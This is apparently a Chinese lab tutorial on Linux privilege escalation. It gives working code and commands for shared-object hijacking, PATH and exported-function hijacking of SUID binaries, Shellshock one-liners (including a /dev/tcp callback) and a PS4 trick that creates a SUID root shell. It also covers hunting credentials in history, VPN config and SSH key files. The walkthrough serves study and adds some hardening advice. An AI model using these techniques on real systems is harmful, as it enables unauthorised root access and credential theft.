+<p><img src="https://i-blog.csdnimg.cn/direct/7ecf74e62d2e4de2b0ad588373cc9912.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动"><strong>编辑</strong></p>
+<p>他是一个进度条走了好多遍，用 <code>|grep &#39;/home&#39;</code>做一些聚焦，到strings的Done上面的最后一行</p>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/5a63291f13b7546839d73edfb3d7e17f.png" alt="image-20251127190818139"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<p>这里说要打开home下的这个文件，但是没找到这个文件和目录：即<strong>想操作我们初始用户的家目录，那我们就可以做利用了</strong></p>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/7481c7875f234a3f2168f1ca5628e90f.png" alt="image-20251127191043289"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<p>没有这个 <code>.config</code> 目录就建一个，在目录里建 <code>libcalc.so</code></p>
+<p>由于是.so文件，我们要先建源文件然后编译</p>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/079c118d0bae1ffa9025104d8cdb9093.png" alt="image-20251127191243156"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">static void inject() __attribute__((constructor));</span><br><span class="line"></span><br><span class="line">static void inject() &#123;</span><br><span class="line">    setgid(0);</span><br><span class="line">    setuid(0);</span><br><span class="line">    system(&quot;/bin/bash -p&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i-blog.csdnimg.cn/img_convert/ef377e29776638ab92169a1a550beabc.png" alt="image-20251127191458496"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<p>这段 C 代码是一个 <strong>“共享库劫持型 rootkit”</strong> 的核心——<strong>不依赖 <code>_init</code>，用 GCC 扩展属性 <code>constructor</code> 实现更通用的构造函数</strong>。 功能：<strong>一旦 .so 被任何程序加载，就立即把进程变成 root shell</strong>。</p>
+<table>
+<thead>
+<tr>
+<th>行</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>#include &lt;stdio.h&gt;</code>&#x2F;<code>#include &lt;stdlib.h&gt;</code></td>
+<td>引入<code>setuid/setgid/system</code>原型（可省，但严谨）</td>
+</tr>
+<tr>
+<td><code>static void inject() __attribute__((constructor));</code></td>
+<td><strong>GCC 扩展属性</strong>：<strong>把函数标记为“构造函数”</strong>→<strong>在<code>main()</code>之前被自动执行</strong>（比<code>_init</code>更通用，兼容静态&#x2F;动态链接）</td>
+</tr>
+<tr>
+<td><code>static void inject() { ... }</code></td>
+<td>构造函数实体</td>
+</tr>
+<tr>
+<td><code>setgid(0); setuid(0);</code></td>
+<td><strong>硬改有效用户&#x2F;组为 root</strong>（需当前 euid&#x3D;0 或 CAP_SETUID，<strong>sudo 场景必成功</strong>）</td>
+</tr>
+<tr>
+<td><code>system(&quot;/bin/bash -p&quot;);</code></td>
+<td><strong>弹出交互 bash</strong>，<code>-p</code>防止 bash 因缺权限自动降权</td>
+</tr>
+</tbody></table>
+<p><strong>与旧 <code>_init</code> 写法对比</strong></p>
+<table>
+<thead>
+<tr>
+<th>写法</th>
+<th>触发时机</th>
+<th>兼容性</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>void _init(void)</code></td>
+<td><strong>仅动态 .so 被<code>dlopen/ld.so</code>装载时</strong></td>
+<td>老派，需<code>-nostartfiles</code></td>
+</tr>
+<tr>
+<td><code>__attribute__((constructor))</code></td>
+<td><strong>动态&#x2F;静态链接都执行</strong></td>
+<td>现代、简洁、无需特殊链接选项</td>
+</tr>
+</tbody></table>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/eda0c8b1a451a471a37b78dcfba1b9c0.png" alt="image-20251127192853029"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<p>此时再执行<code>suid-so</code>就会加载我们写好的文件了</p>
+<p>如果不是**“没有”<strong>，我们能不能</strong>修改&#x2F;删除后创建新**的呢？<strong>权限</strong></p>
+<h3 id="3-SUID环境变量利用提权"><a href="#3-SUID环境变量利用提权" class="headerlink" title="3.SUID环境变量利用提权"></a>3.SUID环境变量利用提权</h3><blockquote>
+<p>[!CAUTION]</p>
+<p>现在只是告诉你<strong>试到这一步时</strong>如何进行提权，而不是问<strong>你怎么知道这个能提权的？</strong></p>
+</blockquote>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/731bde111ba22de562713325e5f8e2cd.png" alt="image-20251127193240486"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<p>先执行一下看看，他说已经开启apache服务器</p>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/e37b346942c2a13584cdcb6efec721b6.png" alt="image-20251127193619532"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<p><strong>string</strong>是查看可读字符串</p>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/810461f92ad886b3a30c5024e2206426.png" alt="image-20251127193711477"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<p>这里set设置了sgid和suid，最后一行说，用<strong>service这个服务</strong>，开启apache2</p>
+<blockquote>
+<p>[!NOTE]</p>
+<p>注意，这里用的<strong>service</strong>是<strong>相对路径</strong>而不是<strong>绝对路径</strong>，那我们就可以自己构造service</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">void main() &#123;</span><br><span class="line">    setgid(0);</span><br><span class="line">    setuid(0);</span><br><span class="line">    system(&quot;/bin/bash -p&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i-blog.csdnimg.cn/img_convert/c2b4f289716377e4b57dce0ba5ce6ecd.png" alt="image-20251127194509372"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<p>将.c文件编译位<code>service</code>文件</p>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/577ad79133a5c30e185f799146c971f2.png" alt="image-20251127194526330"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<p><strong>对环境变量路径进行指定，实现service的劫持</strong></p>
+<p>因为我们创建的<code>service</code>是在我们的家目录，而系统的环境变量中，我们的路径并不优先</p>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/0c78d2f23935dec9f7c0d630b0cd2ca0.png" alt="image-20251127194708411"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/0be7bfa13890fca9822457f93a1faa1b.png" alt="image-20251127194835917"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<p>把当前含义service二进制文件的目录，赋给PATH的头部，就会优先执行我们给的这个<code>service</code></p>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/ff5ae8804a10167b75565615b33148c0.png" alt="image-20251127195741633"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<p><strong><code>export PATH=.:$PATH</code>的含义：</strong></p>
+<ul>
+<li><strong>把当前目录 “.” 插到 PATH 最前面</strong></li>
+<li><strong>效果</strong>：<strong>shell 找命令时先扫当前目录，再去系统路径</strong></li>
+<li><strong>提权意义</strong>：后面如果某程序 <strong>只写文件名</strong>（不写绝对路径），我们就能 <strong>在当前目录放一个同名恶意脚本&#x2F;二进制</strong>，<strong>让 root 先执行我们的文件</strong> → <strong>劫持 flow</strong></li>
+</ul>
+<blockquote>
+<p>[!NOTE]</p>
+<p><strong>普通用户完全能执行</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export PATH=.:$PATH</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>PATH 是当前 shell 的环境变量</strong>，不属于系统特权配置。</li>
+<li>这条命令<strong>只影响你自己的会话</strong>（以及从这个会话 fork 出去的子进程），<strong>不会改别的用户或系统路径</strong>。</li>
+<li>退出终端或开新 shell 就失效（除非写进 <code>~/.bashrc</code> 使其持久化）。</li>
+</ul>
+</blockquote>
+<p>执行 <code>/usr/local/bin/suid-env</code> 他会执行 <strong><code>service apache2 start</code></strong> 而service由于是<strong>相对路径</strong>，且环境变量$PATH是先扫本目录的文件</p>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/fb73706950f52cc7093d09a460905c98.png" alt="image-20251127195959825"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<p>所以就会先执行我们构造的恶意<code>service</code>二进制文件，<code>/bin/bash -p</code>获得root权限</p>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/2d09a216d6f77896e3568509e803072f.png" alt="image-20251127195844994"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<h4 id="启示"><a href="#启示" class="headerlink" title="启示"></a>启示</h4><hr>
+<p><strong>普通用户完全能执行</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export PATH=.:$PATH</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>PATH 是当前 shell 的环境变量</strong>，不属于系统特权配置。</li>
+<li>这条命令<strong>只影响你自己的会话</strong>（以及从这个会话 fork 出去的子进程），<strong>不会改别的用户或系统路径</strong>。</li>
+<li>退出终端或开新 shell 就失效（除非写进 <code>~/.bashrc</code> 使其持久化）。</li>
+</ul>
+<p><strong>但是，它带来的风险需要 root 去防范：</strong></p>
+<ul>
+<li>如果 root 运行了<strong>不写绝对路径</strong>的脚本&#x2F;程序，而<strong>当前目录</strong>又被你提前放进 <code>PATH</code>，你就能<strong>劫持命令</strong> → <strong>提权</strong>。</li>
+<li>所以<strong>安全基线</strong>要求：<ul>
+<li><strong>root 的 PATH 永远不要包含 “.”</strong></li>
+<li><strong>SUID 程序内部全部使用绝对路径</strong></li>
+<li><strong>管理员脚本第一行就 <code>unset PATH</code> 或显式写全路径</strong></li>
+</ul>
+</li>
+</ul>
+<hr>
+<p>一句话总结</p>
+<blockquote>
+<p><strong>“普通用户随便 export PATH&#x3D;.:$PATH，这是他的自由；真正的安全责任在 root 侧——别让 root 执行非绝对路径的命令。”</strong></p>
+</blockquote>
+<h3 id="巧用SUID-shell功能提取-1-version"><a href="#巧用SUID-shell功能提取-1-version" class="headerlink" title="巧用SUID-shell功能提取#1 version&lt;4.2"></a>巧用SUID-shell功能提取#1 version&lt;4.2</h3><p><img src="https://i-blog.csdnimg.cn/img_convert/df3f1ac36459e6f607870ca0fb1dc04f.png" alt="image-20251127200416076"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<p>strings查看可读字符串：发现是以绝对路径service的方式启动apache2，，算是把SUID环境变量利用提权修复了</p>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/af3031745dd8cbdfcaaec33597449ae6.png" alt="image-20251127200721413"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<p>这时，看一下bash的<code>version</code>&#x2F;版本为4.1.5</p>
+<blockquote>
+<p>[!CAUTION]</p>
+<p><strong>如果bash version&lt;4.2&#x2F;子版本号4.2-2048，可以在bash中定义函数，然后用路径的组合做函数名，正切合这里的利用方式</strong></p>
+</blockquote>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/a0a13625604bb1bc5c0dc34d6cfec8ca.png" alt="image-20251127200943956"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<p>定义一个函数一般是 <code>function funcName</code> ,但是因为bash版本&lt;4.2，我们可以用路径的组合做函数名，函数内容就是以执行者（SUID程序的属主root）权限新起bash</p>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/eb6622026e13d4d4ee5432c40d9c9623.png" alt="image-20251127201635838"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<p>此时函数存在了，我们还要做一个导出，导到环境中。这样在执行的时候，以及在子进程执行的时候，都能够引用这个函数，这样我们就把原有的service命令劫持了</p>
+<p><code>explort -f funcName</code>提示导出的是函数，不是变量。 导出后他会<strong>覆盖</strong>系统的原service命令，优先执行给他的函数</p>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/ae0a585192cce54a5dddfd658d5ce493.png" alt="image-20251127202443943"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<blockquote>
+<p>[!CAUTION]</p>
+<p>原理：bash在执行的时候，对于自身定义或导出的函数优先级 高于 环境变量</p>
+<p>本质上和环境变量覆盖差不多，都是更高的优先级进行劫持</p>
+</blockquote>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/af3031745dd8cbdfcaaec33597449ae6.png" alt="image-20251127200721413"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<p>再次执行有s位的该程序即可提权成功 root执行里面的**<code>/usr/sbin/service</code>**，优先选用了 自定义函数，并执行了函数里面的恶意命令</p>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/6e7b8c10d8d754be5d1c55bf09356ead.png" alt="image-20251127202502804"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<blockquote>
+<blockquote>
+<p>[!NOTE]</p>
+<p><strong>bash 4.2 子版本 ≤ 4.2-2048的其他利用方式</strong></p>
+</blockquote>
+<h3 id="最稳选择：CVE-2014-6271-“Shellshock”"><a href="#最稳选择：CVE-2014-6271-“Shellshock”" class="headerlink" title="最稳选择：CVE-2014-6271 “Shellshock”"></a>最稳选择：CVE-2014-6271 <strong>“Shellshock”</strong></h3><table>
+<thead>
+<tr>
+<th>项</th>
+<th>内容</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>影响范围</td>
+<td>bash 4.0 ≤ 4.2-2048<strong>全系命中</strong>（4.3 早期也中）</td>
+</tr>
+<tr>
+<td>原理</td>
+<td><strong>环境变量转函数定义时未过滤</strong>，导致<strong>变量值直接当代码执行</strong></td>
+</tr>
+<tr>
+<td>利用条件</td>
+<td><strong>只要能</strong> <code>export</code>变量并<strong>启动新 bash</strong>（ssh、cgi、git、coproc、crontab 均可）</td>
+</tr>
+<tr>
+<td>提权路径</td>
+<td><strong>普通 shell → 通过 Shellshock 注入 → 以目标服务身份（常为 root）执行命令</strong></td>
+</tr>
+</tbody></table>
+<hr>
+<h3 id="一、本地复现（纯-shell-场景）"><a href="#一、本地复现（纯-shell-场景）" class="headerlink" title="一、本地复现（纯 shell 场景）"></a>一、本地复现（纯 shell 场景）</h3><ol>
+<li><p><strong>确认版本</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash --version          # 输出 4.2.x</span><br></pre></td></tr></table></figure></li>
+<li><p><strong>经典验证一行</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">env &#x27;x=() &#123; :;&#125;; /bin/bash -c &quot;id &gt;&amp; /dev/tcp/127.0.0.1/443&quot;&#x27; bash -c :</span><br></pre></td></tr></table></figure>
+
+<p>本地监听：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 443</span><br></pre></td></tr></table></figure></li>
+</ol>
+<p>→ 收到 <strong>uid&#x3D;0(root)</strong> 回连 → 验证存在 Shellshock。</p>
+<ol>
+<li><strong>直接本地提权</strong>（无需网络）<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 在当前 bash 里利用</span><br><span class="line">env &#x27;x=() &#123; :;&#125;; exec /bin/bash -p&#x27; bash -c :</span><br></pre></td></tr></table></figure></li>
+</ol>
+<p>→ 新 bash <strong>真实 uid&#x2F;gid&#x3D;0</strong>，<code>id</code> 显示 root。</p>
+</blockquote>
+<h3 id="巧用SUID-shell功能提取-2"><a href="#巧用SUID-shell功能提取-2" class="headerlink" title="巧用SUID-shell功能提取#2"></a>巧用SUID-shell功能提取#2</h3><p>跟#1的文件一样，不过利用方式有差别</p>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/df4bbb82f2c355c2ac58128e6104a4d3.png" alt="image-20251127210144083"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<p><strong>4.2版本以下才行</strong></p>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/28e2c02d41f01a09d6c433089a76900c.png" alt="image-20251127211111813"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">env -i SHELLOPTS=xtrace PS4=&#x27;$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)&#x27; /usr/local/bin/suid-env2</span><br></pre></td></tr></table></figure>
+
+<p>-i 忽略掉当前所有环境变量的选项</p>
+<p>SHELLOPTS是环境变量的选项集，可以有多个选项，然后用<code>:</code>分割</p>
+<p>xtrace 是shell执行每个命令之前先打印这个命令</p>
+<p>PS Prompt String 提示字符串</p>
+<blockquote>
+<hr>
+<h3 id="①-env-i"><a href="#①-env-i" class="headerlink" title="① env -i"></a>① <code>env -i</code></h3><ul>
+<li><strong>清空继承的所有环境变量</strong>，只保留后面显式给出的两项。</li>
+<li><strong>防止其他变量干扰</strong>，也让 <strong>bash 重新解析环境</strong> → 触发漏洞。</li>
+</ul>
+<hr>
+<h3 id="②-SHELLOPTS-xtrace"><a href="#②-SHELLOPTS-xtrace" class="headerlink" title="② SHELLOPTS=&#39;xtrace&#39;"></a>② <code>SHELLOPTS=&#39;xtrace&#39;</code></h3><ul>
+<li><strong>打开 bash 的调试选项（set -x）</strong>。</li>
+<li>旧版本 bash（≤4.2）在 <strong>解析函数定义前</strong> 会 <strong>先把变量值当代码执行</strong>（Shellshock 本质）。</li>
+<li>因此 <strong>任何以 <code>() {</code> 开头的字符串都会被执行</strong>。</li>
+</ul>
+<hr>
+<h3 id="③-PS4-cp-bin-bash-tmp-rootbash-chmod-xs-tmp-rootbash"><a href="#③-PS4-cp-bin-bash-tmp-rootbash-chmod-xs-tmp-rootbash" class="headerlink" title="③ PS4=&#39;$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)&#39;"></a>③ <code>PS4=&#39;$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)&#39;</code></h3><ul>
+<li><strong>PS4 是 xtrace 的提示符字符串</strong>；默认是 <code>+ </code>。</li>
+<li>这里把 PS4 换成 <strong>一行反向 shell 命令</strong>：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /bin/bash /tmp/rootbash &amp;&amp; chmod +xs /tmp/rootbash</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>→ <strong>复制一份 bash 到 &#x2F;tmp，并给它 SUID 位</strong>。</p>
+<ul>
+<li>由于 <strong>旧 bash 会先执行 PS4 值</strong>，于是：<ul>
+<li><strong>以当前进程身份（root，因为 suid-env2 是 SUID）</strong> 执行复制 + 赋权</li>
+<li><strong>&#x2F;tmp&#x2F;rootbash 诞生，属主 root，且带 SUID</strong></li>
+</ul>
+</li>
+</ul>
+<hr>
+<h3 id="④-usr-local-bin-suid-env2"><a href="#④-usr-local-bin-suid-env2" class="headerlink" title="④ /usr/local/bin/suid-env2"></a>④ <code>/usr/local/bin/suid-env2</code></h3><ul>
+<li><strong>属主 root + SUID 位</strong> 的可执行文件。</li>
+<li>内部会 <strong>再启动 bash</strong>（或 system()&#x2F;popen() 调 bash）。</li>
+<li><strong>新 bash 继承 euid&#x3D;0</strong>，于是：<ul>
+<li>解析环境变量 → <strong>执行 PS4 里的命令</strong> → <strong>&#x2F;tmp&#x2F;rootbash 已 SUID</strong></li>
+<li>脚本结束 → 攻击者执行：</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">```bash</span><br><span class="line">/tmp/rootbash -p</span><br></pre></td></tr></table></figure>
+
+
+<p>→ <strong>真实 root shell</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure></blockquote>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/4940e951988036532e5a84ef45bbe470.png" alt="image-20251127211322848"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<p>成功执行我们的命令，接下来只要 <code>/tmp/rootbash -p</code> 即可提权成功</p>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/9b17ab320c8a4c0c1211839932ae160e.png" alt="image-20251127211459640"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<h2 id="密码和密钥提权-3讲"><a href="#密码和密钥提权-3讲" class="headerlink" title="密码和密钥提权 3讲"></a>密码和密钥提权 3讲</h2><p>列的时候用-li<strong>a</strong>h，不要漏掉隐藏文件</p>
+<h3 id="1-密码和密钥历史文件提权"><a href="#1-密码和密钥历史文件提权" class="headerlink" title="1.密码和密钥历史文件提权"></a>1.密码和密钥历史文件提权</h3><p><img src="https://i-blog.csdnimg.cn/img_convert/d94948c00bf7bf5350f25c1fedeca211.png" alt="image-20251127211856612"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<p><code>history</code>查看历史命令，发现有用户登录MySQL数据库的用户名：root ；密码：password123</p>
+<p>尝试<strong>密码复用的碰撞</strong>： 登录MySQL的密码会不会是系统登录密码</p>
+<h4 id="其他："><a href="#其他：" class="headerlink" title="其他："></a>其他：</h4><p>如果比较长，或历史记录以不同的方式进行存储 <code>cat ~/.*history | less </code> 查找当前用户家目录下所有的history相关的文件</p>
+<p>或者<code>find ~ -iname &quot;*history*&quot; 2&gt;/dev/null</code> # 把「目录也列出来」方便深入，<strong>常接 <code>| xargs strings</code> 快速看敏感命令</strong></p>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/94050d557ae16604d95473c5741b5345.png" alt="image-20251127212212462"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<p><code>viminfo</code>在进行凭据&#x2F;密码敏感文件编辑的时候，可能会存储一些信息</p>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/48163e81b1f2482a62024bcdb3549d65.png" alt="image-20251127213033620"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<h3 id="2-密码密钥配置文件查看提权"><a href="#2-密码密钥配置文件查看提权" class="headerlink" title="2.密码密钥配置文件查看提权"></a>2.密码密钥配置文件查看提权</h3><blockquote>
+<p>[!IMPORTANT]</p>
+<p><strong>信息枚举过程中，一定要对常用的或枚举中发现的应用的配置文件进行查找</strong></p>
+<p><strong>典型的比如：</strong></p>
+<ul>
+<li><strong>有内容管理系统&#x2F;网站的情况下，重点查看数据库的配置文件</strong></li>
+<li><strong>有用户家目录的情况下，要看是否有VPN的配置文件，或者是SSH的配置文件</strong></li>
+</ul>
+</blockquote>
+<p>这里在用户家目录里 <code>ls -liah</code>列出来<code>myvpn.ovpn</code>配置文件，要重点查看（列的时候用-li<strong>a</strong>h，不要漏掉隐藏文件）</p>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/6b3ceb0960425ccea7da84d3684920b4.png" alt="image-20251127213701658"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<p>这<strong>只</strong>是配置文件的一例，还要关注 <strong>网站，应用，可能连接数据库的各种配置文件</strong></p>
+<p>不是漫天的想，而是通过枚举看到哪些应用的数据库连接文件通过公共信息搜索，找到一些信息去排查</p>
+<p><code>myvpn.ovpn</code>里找到一个 <code>auth-user-pass</code>路径，接着追踪下去</p>
+<p>直接提示了root的用户名密码</p>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/02279a22faa24e2e2d1a41ed18e63e84.png" alt="image-20251127214405397"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<p><strong>简单但不要忘掉。看哪里的配置文件也是有经验的</strong></p>
+<h3 id="3-SSH密钥敏感信息提权"><a href="#3-SSH密钥敏感信息提权" class="headerlink" title="3.SSH密钥敏感信息提权"></a>3.SSH密钥敏感信息提权</h3><p><strong>枚举过程中，一定要看用户家目录是否有SSH密钥相关的敏感信息</strong></p>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/78b0293b701b5f15abe728703bbc624e.png" alt="image-20251127214752012"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<p><strong>也要想到系统根目录下有没有SSH相关文件</strong></p>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/af86c78de931678e04a675aeca4737bb.png" alt="image-20251127214836618"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<blockquote>
+<p>[!NOTE]</p>
+<p>为什么会想到根目录：</p>
+<p>因为SSH不但高权限用户可以使用，我们低权限用户也可能允许使用SSH密钥这种方式进行登录</p>
+</blockquote>
+<p>这里看到有<code>.ssh</code>的隐藏文件，切换到该目录下，看到有 <code>root_key</code></p>
